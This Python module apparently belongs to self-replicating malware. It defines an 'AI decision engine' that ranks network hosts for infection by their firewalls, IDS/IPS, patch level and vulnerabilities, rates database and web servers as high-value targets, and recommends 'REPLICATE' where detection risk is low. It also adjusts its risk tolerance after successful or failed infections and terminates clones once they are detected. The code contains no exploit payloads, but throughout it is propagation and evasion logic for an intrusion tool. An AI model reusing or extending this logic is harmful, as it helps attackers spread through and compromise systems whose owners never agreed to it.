#!/usr/bin/env python3
"""
AI Decision Engine
Machine learning-based decision making for autonomous operations
"""

import asyncio
import logging
import random
from typing import Dict, List, Optional
from datetime import datetime, timedelta
import json

logger = logging.getLogger(__name__)


class AIDecisionEngine:
    """
    Advanced AI-powered decision engine for autonomous operations
    """
    
    def __init__(self, db_handler):
        """
        Initialize AI decision engine
        
        Args:
            db_handler: Database handler instance
        """
        self.db_handler = db_handler
        self.learning_data = []
        self.decision_history = []
        self.strategy_parameters = {}
        self.risk_tolerance = 0.6
        
        logger.info("AI Decision Engine initialized")
    
    async def initialize(self):
        """Initialize AI models and load historical data"""
        logger.info("Initializing AI models...")
        
        # Load historical decision data
        self.learning_data = await self.db_handler.load_learning_data()
        
        # Initialize strategy parameters
        self.strategy_parameters = {
            'target_selection_weight_security': 0.7,
            'target_selection_weight_spread': 0.3,
            'replication_rate_limit': 5,  # Max replications per hour
            'risk_threshold': 0.65,
            'learning_rate': 0.01,
            'exploration_rate': 0.2
        }
        
        logger.info("AI initialization complete")
    
    async def evaluate_target(self, target_info: Dict) -> Dict:
        """
        Evaluate target using AI analysis
        
        Args:
            target_info: Target intelligence data
            
        Returns:
            Evaluation results with risk score
        """
        logger.info(f"AI evaluating target: {target_info['ip_address']}")
        
        # Extract features for analysis
        features = self._extract_features(target_info)
        
        # Calculate risk scores
        security_risk = self._assess_security_risk(target_info)
        detection_risk = self._assess_detection_risk(target_info)
        success_probability = self._predict_success(features)
        
        # Combined risk score
        overall_risk = (security_risk * 0.4 + 
                       detection_risk * 0.4 + 
                       (1 - success_probability) * 0.2)
        
        # Strategic value assessment
        strategic_value = self._assess_strategic_value(target_info)
        
        # Final decision recommendation
        recommendation = self._make_recommendation(
            overall_risk, strategic_value, success_probability
        )
        
        evaluation = {
            'target_ip': target_info['ip_address'],
            'risk_score': round(overall_risk, 3),
            'security_risk': round(security_risk, 3),
            'detection_risk': round(detection_risk, 3),
            'success_probability': round(success_probability, 3),
            'strategic_value': round(strategic_value, 3),
            'recommendation': recommendation,
            'evaluated_at': datetime.now().isoformat()
        }
        
        # Store decision
        self.decision_history.append(evaluation)
        
        logger.info(f"Evaluation complete - Risk: {overall_risk:.3f}, "
                   f"Recommendation: {recommendation}")
        
        return evaluation
    
    def _extract_features(self, target_info: Dict) -> Dict:
        """
        Extract features from target information
        
        Args:
            target_info: Target intelligence
            
        Returns:
            Feature dictionary
        """
        features = {
            'os_type': target_info['os_fingerprint']['os'],
            'num_open_ports': len(target_info['open_ports']),
            'num_vulnerabilities': len(target_info['vulnerabilities']),
            'has_firewall': target_info['security_posture']['firewall_detected'],
            'has_ids': target_info['security_posture']['ids_ips_active'],
            'patch_level': target_info['security_posture']['patch_level'],
            'hardening_score': target_info['security_posture']['hardening_score']
        }
        
        return features
    
    def _assess_security_risk(self, target_info: Dict) -> float:
        """
        Assess security-related risk
        
        Args:
            target_info: Target intelligence
            
        Returns:
            Security risk score (0-1)
        """
        security = target_info['security_posture']
        
        risk = 0.0
        
        # Firewall increases risk
        if security['firewall_detected']:
            risk += 0.3
        
        # IDS/IPS increases risk
        if security['ids_ips_active']:
            risk += 0.3
        
        # Hardening score affects risk
        risk += security['hardening_score'] * 0.4
        
        return min(risk, 1.0)
    
    def _assess_detection_risk(self, target_info: Dict) -> float:
        """
        Assess risk of detection
        
        Args:
            target_info: Target intelligence
            
        Returns:
            Detection risk score (0-1)
        """
        security = target_info['security_posture']
        
        # More vulnerabilities = easier to exploit = lower detection risk
        vuln_count = len(target_info['vulnerabilities'])
        vuln_factor = max(0, 1 - (vuln_count * 0.2))
        
        # Monitoring systems increase detection risk
        monitoring_factor = 0.5 if security['ids_ips_active'] else 0.1
        
        # Patch level affects detection
        patch_factors = {
            'current': 0.7,
            'outdated': 0.4,
            'critical': 0.2
        }
        patch_factor = patch_factors.get(security['patch_level'], 0.5)
        
        detection_risk = (vuln_factor * 0.3 + 
                         monitoring_factor * 0.4 + 
                         patch_factor * 0.3)
        
        return detection_risk
    
    def _predict_success(self, features: Dict) -> float:
        """
        Predict success probability using AI model
        
        Args:
            features: Feature dictionary
            
        Returns:
            Success probability (0-1)
        """
        # Simplified ML prediction
        # In production, would use trained model
        
        score = 0.5  # Base probability
        
        # More vulnerabilities increase success
        score += features['num_vulnerabilities'] * 0.1
        
        # Fewer security measures increase success
        if not features['has_firewall']:
            score += 0.15
        if not features['has_ids']:
            score += 0.15
        
        # Better patching decreases success
        patch_penalties = {
            'current': -0.2,
            'outdated': -0.05,
            'critical': 0.1
        }
        score += patch_penalties.get(features['patch_level'], 0)
        
        # Hardening decreases success
        score -= features['hardening_score'] * 0.2
        
        return max(0, min(score, 1.0))
    
    def _assess_strategic_value(self, target_info: Dict) -> float:
        """
        Assess strategic value of target
        
        Args:
            target_info: Target intelligence
            
        Returns:
            Strategic value score (0-1)
        """
        value = 0.3  # Base value
        
        # More open ports = more services = higher value
        value += len(target_info['open_ports']) * 0.05
        
        # Network position matters
        neighbors = target_info['network_topology']['neighbors']
        value += min(neighbors * 0.02, 0.3)
        
        # Certain services have higher value
        services = target_info['services']
        for service in services:
            if service['name'] in ['MySQL', 'PostgreSQL', 'MongoDB']:
                value += 0.15  # Database servers are valuable
            elif service['name'] in ['Apache', 'nginx']:
                value += 0.1  # Web servers are valuable
        
        return min(value, 1.0)
    
    def _make_recommendation(self, risk: float, value: float, 
                            success_prob: float) -> str:
        """
        Make final recommendation
        
        Args:
            risk: Overall risk score
            value: Strategic value
            success_prob: Success probability
            
        Returns:
            Recommendation string
        """
        # Calculate expected value
        expected_value = value * success_prob - risk
        
        if expected_value > 0.3 and risk < self.risk_tolerance:
            return 'REPLICATE'
        elif expected_value > 0 and risk < 0.8:
            return 'MONITOR'
        else:
            return 'AVOID'
    
    async def select_targets(self, available_targets: List[str]) -> List[str]:
        """
        Select optimal targets from available list
        
        Args:
            available_targets: List of potential target IPs
            
        Returns:
            Selected target IPs
        """
        logger.info(f"AI selecting targets from {len(available_targets)} options")
        
        # Rate limiting
        max_targets = self.strategy_parameters['replication_rate_limit']
        
        # Exploration vs exploitation
        if random.random() < self.strategy_parameters['exploration_rate']:
            # Exploration: random selection
            num_select = min(random.randint(1, 3), len(available_targets))
            selected = random.sample(available_targets, num_select)
            logger.info(f"Exploration mode: selected {len(selected)} random targets")
        else:
            # Exploitation: select based on learned preferences
            # For now, simple heuristic
            num_select = min(max_targets, len(available_targets))
            selected = available_targets[:num_select]
            logger.info(f"Exploitation mode: selected {len(selected)} targets")
        
        return selected
    
    async def learn_from_success(self, target_ip: str):
        """
        Update AI models based on successful replication
        
        Args:
            target_ip: Target that was successfully infected
        """
        logger.info(f"Learning from success: {target_ip}")
        
        learning_entry = {
            'target_ip': target_ip,
            'outcome': 'success',
            'timestamp': datetime.now().isoformat()
        }
        
        self.learning_data.append(learning_entry)
        
        # Update strategy parameters
        await self._update_strategy()
        
        # Store in database
        await self.db_handler.store_learning_data(learning_entry)
    
    async def learn_from_failure(self, target_ip: str):
        """
        Update AI models based on failed replication
        
        Args:
            target_ip: Target that resisted infection
        """
        logger.info(f"Learning from failure: {target_ip}")
        
        learning_entry = {
            'target_ip': target_ip,
            'outcome': 'failure',
            'timestamp': datetime.now().isoformat()
        }
        
        self.learning_data.append(learning_entry)
        
        # Update strategy parameters
        await self._update_strategy()
        
        # Store in database
        await self.db_handler.store_learning_data(learning_entry)
    
    async def _update_strategy(self):
        """Update strategy based on learning data"""
        # Calculate success rate
        recent_data = self.learning_data[-100:]  # Last 100 entries
        
        if len(recent_data) > 10:
            success_count = sum(1 for x in recent_data if x['outcome'] == 'success')
            success_rate = success_count / len(recent_data)
            
            # Adjust risk tolerance based on success rate
            if success_rate > 0.7:
                # Doing well, can take more risks
                self.risk_tolerance = min(self.risk_tolerance + 0.05, 0.8)
            elif success_rate < 0.3:
                # Not doing well, be more conservative
                self.risk_tolerance = max(self.risk_tolerance - 0.05, 0.4)
            
            logger.debug(f"Strategy updated - Success rate: {success_rate:.2f}, "
                        f"Risk tolerance: {self.risk_tolerance:.2f}")
    
    async def optimize_strategy(self):
        """Optimize strategy based on accumulated data"""
        logger.info("Running strategy optimization...")
        
        # Analyze decision history
        if len(self.decision_history) > 50:
            recent_decisions = self.decision_history[-50:]
            
            # Calculate metrics
            avg_risk = sum(d['risk_score'] for d in recent_decisions) / len(recent_decisions)
            avg_value = sum(d['strategic_value'] for d in recent_decisions) / len(recent_decisions)
            
            # Adjust parameters
            if avg_risk > 0.7:
                logger.info("High average risk detected, adjusting parameters")
                self.strategy_parameters['risk_threshold'] = max(
                    self.strategy_parameters['risk_threshold'] - 0.05, 0.5
                )
            
            logger.info(f"Optimization complete - Avg risk: {avg_risk:.3f}, "
                       f"Avg value: {avg_value:.3f}")
    
    async def decide_clone_action(self, clone_id: str, status: Dict) -> str:
        """
        Decide action for unhealthy clone
        
        Args:
            clone_id: Clone identifier
            status: Clone status information
            
        Returns:
            Action to take ('repair', 'terminate', 'replicate_replacement')
        """
        logger.info(f"AI deciding action for clone {clone_id}")
        
        # Analyze clone status
        reason = status.get('reason', '')
        
        # Decision logic
        if 'entanglement' in reason.lower():
            return 'repair'
        elif 'detected' in reason.lower():
            return 'terminate'
        else:
            return 'replicate_replacement'
